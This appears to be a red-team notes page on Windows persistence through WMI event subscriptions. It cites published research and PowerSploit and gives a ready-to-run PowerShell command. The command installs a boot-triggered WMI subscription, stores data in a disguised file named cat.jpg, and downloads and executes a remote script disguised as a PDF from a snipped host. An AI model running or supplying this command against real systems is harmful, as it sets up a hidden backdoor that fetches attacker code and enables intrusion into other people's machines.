# Windows Persistence

## WMI Subscription

### Install wmi persistence for on-boot

Great research can be found on Black Hats site[^1]. The script can be found at https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1 or in the Empire agent.

!!! warning
    This method sometimes returns two callbacks on boot!

```powershell
Install-WmiSubscription -CustomEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320" -Namespace "root\cimv2" -DiskStorageLocation "C:\Windows\tasks\cat.jpg" -Command "`"&([ScriptBlock]::Create((([Char[]](New-Object Net.WebClient).DownloadData('http://www.--SNIP--.com/corp/priv/cloud/adp_update.pdf'))-Join'')))`"" -Verbose
```

[^1]: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf